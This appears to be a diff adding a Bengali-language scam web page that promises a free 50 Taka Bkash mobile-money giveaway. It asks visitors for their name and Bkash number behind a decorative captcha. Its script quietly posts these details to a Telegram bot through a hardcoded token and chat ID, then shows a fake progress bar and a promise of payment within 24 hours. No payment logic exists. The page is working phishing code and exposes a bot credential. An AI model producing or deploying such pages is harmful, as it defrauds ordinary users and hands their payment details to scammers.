@@ -1,0 +1,242 @@
+<!doctype html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>50 Tk Bkash Giboy</title>
+  <style>
+    body{
+      margin:0;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:#F527BE; 
+      font-family: "Inter", sans-serif;
+      padding:20px;
+    }
+
+    .card{
+      width:100%;
+      max-width:480px;
+      background:#fff;
+      border-radius:20px;
+      box-shadow:0 10px 35px rgba(0,0,0,0.25);
+      padding:50px 35px;
+      display:flex;
+      flex-direction:column;
+      gap:25px;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+    .card:hover{
+      transform: translateY(-5px);
+      box-shadow:0 15px 45px rgba(0,0,0,0.3);
+    }
+
+    h1{
+      text-align:center;
+      font-size:26px;
+      color:#F527BE;
+      margin:0 0 10px;
+      letter-spacing:1px;
+    }
+
+    label{
+      display:block;
+      margin-bottom:8px;
+      font-size:15px;
+      color:#333;
+      font-weight:500;
+    }
+
+    input[type="text"], input[type="tel"]{
+      width:100%;
+      padding:14px 16px;
+      border:1px solid #ccc;
+      border-radius:12px;
+      background:#fff;
+      font-size:15px;
+      outline:none;
+      transition:0.3s;
+    }
+    input[type="text"]:focus,input[type="tel"]:focus{
+      border-color:#F527BE;
+      box-shadow:0 6px 20px rgba(245,39,190,0.2);
+    }
+
+    .captcha-row{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      margin-bottom:12px;
+    }
+    .captcha-box{
+      flex:0 0 40%;
+      background:#f3f3f3;
+      padding:12px;
+      border-radius:8px;
+      text-align:center;
+      font-weight:bold;
+      font-size:18px;
+      letter-spacing:3px;
+      user-select:none;
+      border:1px solid #ccc;
+    }
+    .regen{
+      background:none;
+      border:none;
+      color:#F527BE;
+      font-size:12px;
+      cursor:pointer;
+      margin-left:auto;
+    }
+    .captcha-input{
+      flex:1;
+      padding:12px;
+      border:1px solid #ccc;
+      border-radius:8px;
+    }
+
+    .btn{
+      width:100%;
+      padding:16px;
+      border:none;
+      border-radius:12px;
+      background:#F527BE;
+      color:#fff;
+      font-size:16px;
+      font-weight:bold;
+      cursor:pointer;
+      transition:0.3s;
+    }
+    .btn:hover{
+      background:#d51fab;
+      box-shadow:0 4px 12px rgba(0,0,0,0.2);
+    }
+
+    /* overlay */
+    .overlay{
+      position:fixed;inset:0;
+      background:rgba(0,0,0,0.5);
+      display:none;align-items:center;justify-content:center;
+    }
+    .panel{
+      background:#fff;
+      padding:25px 20px;
+      border-radius:12px;
+      width:320px;
+      text-align:center;
+    }
+    .loader{
+      width:100px;height:100px;border-radius:50%;
+      border:10px solid #eee;
+      border-top-color:#F527BE;
+      margin:0 auto 16px;
+      animation:spin 1s linear infinite;
+    }
+    @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+    .percent{font-weight:bold;font-size:18px;margin-top:10px}
+    .success-msg{font-size:14px;color:#F527BE;font-weight:bold;line-height:1.5}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>50 Tk Bkash Giboy</h1>
+    <form id="payForm">
+      <div>
+        <label for="fullname">Your Name</label>
+        <input id="fullname" type="text" required placeholder="Enter your name">
+      </div>
+
+      <div>
+        <label for="bkashnum">Bkash Number</label>
+        <input id="bkashnum" type="tel" required placeholder="01XXXXXXXXX" pattern="[0-9]{11}">
+      </div>
+
+      <div>
+        <label>Captcha</label>
+        <div class="captcha-row">
+          <div class="captcha-box" id="captchaBox">----</div>
+          <input id="captchaInput" class="captcha-input" placeholder="Type captcha" required>
+          <button type="button" class="regen" id="regenBtn">Regenerate</button>
+        </div>
+      </div>
+
+      <button type="submit" class="btn">Send</button>
+    </form>
+  </div>
+
+  <div class="overlay" id="overlay">
+    <div class="panel">
+      <div class="loader" id="loader"></div>
+      <div class="percent" id="percentText">0%</div>
+      <div class="success-msg" id="successMsg" style="display:none"></div>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8088507666:AAGxnWx0-i6aKT1pWHXskK5VSmDkYqPLYis";
+    const CHAT_ID = "6593402184";
+
+    const captchaBox = document.getElementById('captchaBox');
+    const regenBtn = document.getElementById('regenBtn');
+    const captchaInput = document.getElementById('captchaInput');
+
+    function generateCaptcha(len=5){
+      const chars="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+      let s=""; for(let i=0;i<len;i++) s+=chars[Math.floor(Math.random()*chars.length)];
+      return s;
+    }
+    function renderCaptcha(){
+      const c = generateCaptcha(5);
+      captchaBox.textContent = c;
+      captchaBox.dataset.value = c.toLowerCase();
+    }
+    regenBtn.onclick = ()=>{ renderCaptcha(); captchaInput.value=""; }
+    renderCaptcha();
+
+    const form=document.getElementById('payForm');
+    const overlay=document.getElementById('overlay');
+    const percentText=document.getElementById('percentText');
+    const successMsg=document.getElementById('successMsg');
+    const loader=document.getElementById('loader');
+
+    form.addEventListener('submit', async(e)=>{
+      e.preventDefault();
+      const name=document.getElementById('fullname').value.trim();
+      const number=document.getElementById('bkashnum').value.trim();
+      const typed=captchaInput.value.trim().toLowerCase();
+      const actual=captchaBox.dataset.value;
+      if(typed!==actual){ alert("Captcha wrong!"); renderCaptcha(); return; }
+
+      overlay.style.display="flex";
+      successMsg.style.display="none";
+      loader.style.display="block";
+      percentText.style.display="block";
+      percentText.textContent="0%";
+
+      const message=`New 50Tk Giboy Request\nName: ${name}\nBkash: ${number}\nTime: ${new Date().toLocaleString()}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({chat_id:CHAT_ID,text:message})
+      });
+
+      let p=0;
+      const interval=setInterval(()=>{
+        p+=Math.floor(Math.random()*15)+5;
+        if(p>=100){
+          p=100;
+          clearInterval(interval);
+          loader.style.display="none";
+          percentText.style.display="none";
+          successMsg.style.display="block";
+          successMsg.innerHTML="Your Giboy request successful.<br>You will receive within 24 hours.<br>Please wait a moment.";
+          setTimeout(()=>{overlay.style.display="none";},5000);
+        }
+        percentText.textContent=p+"%";
+      },400);
+    });
+  </script>
+</body>
+</html>
